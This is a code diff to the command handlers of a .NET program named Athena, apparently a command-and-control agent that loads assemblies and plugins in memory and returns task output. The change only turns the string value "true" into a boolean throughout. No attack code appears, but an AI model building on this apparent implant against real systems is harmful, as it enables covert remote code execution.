@@ -74,7 +74,7 @@ namespace Athena.Commands
                         {
                             task_id = job.task.id,
                             user_output = "Invalid target specified",
-                            completed = "true",
+                            completed = true,
                             status = "error"
                         }.ToJson();
 
@@ -85,7 +85,7 @@ namespace Athena.Commands
                 {
                     task_id = job.task.id,
                     user_output = "Successfully loaded assembly",
-                    completed = "true"
+                    completed = true
                 }.ToJson();
 
             }
@@ -95,7 +95,7 @@ namespace Athena.Commands
                 {
                     task_id = job.task.id,
                     user_output = e.Message,
-                    completed = "true",
+                    completed = true,
                     status = "error"
                 }.ToJson();
             }
@@ -111,7 +111,7 @@ namespace Athena.Commands
             {
                 return new ResponseResult()
                 {
-                    completed = "true",
+                    completed = true,
                     user_output = "Std.Out is busy with another command!",
                     task_id = job.task.id,
                 }.ToJson();
@@ -128,7 +128,7 @@ namespace Athena.Commands
                 {
                     return new ResponseResult()
                     {
-                        completed = "true",
+                        completed = true,
                         user_output = "Couldn't get a handle on Std.Out!",
                         task_id = job.task.id,
                     }.ToJson();
@@ -151,7 +151,7 @@ namespace Athena.Commands
                 PluginHandler.ReleaseStdOut();
                 return new ResponseResult
                 {
-                    completed = "true",
+                    completed = true,
                     user_output = this.GetAssemblyOutput() + Environment.NewLine + e + Environment.NewLine + e.ToString(),
                     task_id = job.task.id,
                     status = "error"
@@ -185,7 +185,7 @@ namespace Athena.Commands
                 return new ResponseResult
                 {
                     task_id = job.task.id,
-                    completed = "true",
+                    completed = true,
                     user_output = "AssemblyLoadContext reset."
                 }.ToJson();
             }
@@ -194,7 +194,7 @@ namespace Athena.Commands
                 return new ResponseResult
                 {
                     task_id = job.task.id,
-                    completed = "true",
+                    completed = true,
                     user_output = e.Message,
                     status = "error"
                 }.ToJson();
@@ -207,7 +207,7 @@ namespace Athena.Commands
             {
                 return new LoadCommandResponseResult
                 {
-                    completed = "true",
+                    completed = true,
                     user_output = "Command already loaded.",
                     task_id = task_id,
                     status = "error"
@@ -225,7 +225,7 @@ namespace Athena.Commands
                         this.loadedPlugins.GetOrAdd(command, plug);
                         return new LoadCommandResponseResult()
                         {
-                            completed = "true",
+                            completed = true,
                             user_output = "Command loaded!",
                             task_id = task_id,
                             commands = new List<CommandsResponse>()
@@ -242,7 +242,7 @@ namespace Athena.Commands
 
                 return new LoadCommandResponseResult()
                 {
-                    completed = "true",
+                    completed = true,
                     user_output = "Failed to load command, no assignable type." + Environment.NewLine,
                     task_id = task_id,
                     status = "error",
@@ -253,7 +253,7 @@ namespace Athena.Commands
             {
                 return new LoadCommandResponseResult()
                 {
-                    completed = "true",
+                    completed = true,
                     user_output = "Failed to load Command!" + Environment.NewLine + e.Message,
                     task_id = task_id,
                     status = "error",
@@ -269,7 +269,7 @@ namespace Athena.Commands
 
             return new LoadCommandResponseResult()
             {
-                completed = "true",
+                completed = true,
                 user_output = "Plugins unloaded!",
                 task_id = job.task.id,
                 commands = unloaded,
@@ -299,7 +299,7 @@ namespace Athena.Commands
                 return new ResponseResult()
                 {
                     user_output = e.ToString() + Environment.NewLine + e.InnerException + Environment.NewLine + e.StackTrace,
-                    completed = "true",
+                    completed = true,
                     status = "error",
                     task_id = job.task.id,
                 };
